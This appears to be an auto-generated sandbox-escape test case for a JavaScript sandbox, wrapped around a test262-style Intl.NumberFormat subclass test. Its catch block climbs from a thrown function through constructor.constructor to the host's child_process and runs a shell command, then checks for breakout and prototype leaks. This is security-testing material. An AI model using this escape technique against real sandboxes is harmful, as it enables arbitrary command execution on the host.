try {
    var locales = [
        'tlh',
        'id',
        'en'
    ];
    var a = [
        0,
        1,
        -1,
        -123456.789,
        -Infinity,
        NaN
    ];
    var referenceNumberFormat = new Intl.NumberFormat(locales);
    var referenceFormatted = a.map(referenceNumberFormat.format);
    class MyNumberFormat extends Intl.NumberFormat {
        constructor(locales, options) {
            throw () => {
                return () => {
                };
            };
            super(locales, options);
        }
    }
    var format = new MyNumberFormat(locales);
    var actual = a.map(format.format);
    assert.compareArray(actual, referenceFormatted);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}